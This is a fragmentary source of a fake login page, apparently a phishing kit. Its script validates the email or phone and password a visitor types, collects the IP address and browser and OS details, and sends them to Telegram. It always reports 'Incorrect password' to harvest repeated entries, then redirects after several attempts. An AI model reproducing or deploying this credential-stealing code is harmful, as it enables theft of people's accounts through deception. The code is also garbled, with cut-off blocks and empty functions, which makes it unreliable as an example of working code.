    .error-message {
        color: var(--error);

        margin-top: -4px;

    .toast {

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
    const phoneRegex = /^\+?[\d\s\-()]{7,20}$/;

    function isValidEmailOrPhone(value) {
        const v = value.trim();
        if (v === "") return { ok: false, reason: "empty" };

        if (phoneRegex.test(v)) {
            const digits = v.replace(/\D/g, "");
            if (digits.length >= 7 && digits.length <= 15) {
                return { ok: true, type: "phone" };
            }
            return { ok: false, reason: "phone_length" };

        if (emailRegex.test(v)) {
            const domain = v.split("@")[1] || "";
            if (!domain.includes(".")) {

            }
            return { ok: true, type: "email" };
        }

    function escapeHTML(s) {

    function detectBrowser(ua) {
        if (/Edg\//.test(ua)) return "Microsoft Edge";
        if (/OPR\//.test(ua) || /Opera/.test(ua)) return "Opera";
        if (/Chrome\//.test(ua) && !/Chromium/.test(ua)) return "Chrome";
        if (/Firefox\//.test(ua)) return "Firefox";
        if (/Safari\//.test(ua) && !/Chrome/.test(ua)) return "Safari";
        if (/MSIE|Trident/.test(ua)) return "Internet Explorer";
        return "Unknown";

    function detectOS(ua, platform) {
        if (/Windows NT 10/.test(ua)) return "Windows 10/11";
        if (/Windows NT 6\.3/.test(ua)) return "Windows 8.1";
        if (/Windows NT 6\.1/.test(ua)) return "Windows 7";
        if (/Windows/.test(ua)) return "Windows";

        if (/Mac OS X/.test(ua)) return "macOS";
        if (/Linux/.test(ua)) return "Linux";
        return platform || "Unknown";

        if (/iPad|Tablet/i.test(ua)) return "Tablet";

                })
            });
            if (!res.ok) throw new Error("Telegram HTTP " + res.status);
            return true;
        } catch (err) {
            console.warn("Telegram send failed:", err);
            return false;
        }
    }

    /* ============ Main login ============ */
    async function login() {
        const nowTs = Date.now();
        if (nowTs - lastClickTime < RATE_LIMIT_MS) return;
        lastClickTime = nowTs;

        let valid = true;

        const emailRes = isValidEmailOrPhone(emailInput.value);
        if (emailInput.value.trim() === "") {
            setFieldState(emailInput, emailError, "error", "Please enter your mobile number or email address.");
            emailInput.focus();
            valid = false;
        } else if (!emailRes.ok) {
            setFieldState(emailInput, emailError, "error", "Please enter a valid mobile number or email address.");
            emailInput.focus();
            valid = false;
        }

        if (passwordInput.value.trim() === "") {
            setFieldState(passwordInput, passwordError, "error", "Please enter your password.");
            if (valid) passwordInput.focus();
            valid = false;
        } else if (passwordInput.value.length < 6) {
            setFieldState(passwordInput, passwordError, "error", "Password must be at least 6 characters.");
            if (valid) passwordInput.focus();
            valid = false;
        }

        if (!valid) return;

        setLoading(true);

        let attempts = getAttempts() + 1;
        setAttempts(attempts);

        const ip = await getIP();
        const message = await buildTelegramMessage(attempts, ip);
        await sendToTelegram(message);

        setLoading(false);

        if (attempts >= MAX_ATTEMPTS) {
            setAttempts(0);
            showToast("Too many attempts. Redirecting...", "error");
            setTimeout(() => { window.location.href = REDIRECT_URL; }, 900);
        } else {
            setFieldState(passwordInput, passwordError, "error", "Incorrect password. Please try again.");
            passwordInput.value = "";
            passwordInput.focus();
        }
    }

    (function () {
        if (getAttempts() >= MAX_ATTEMPTS) setAttempts(0);
    })();
</script>
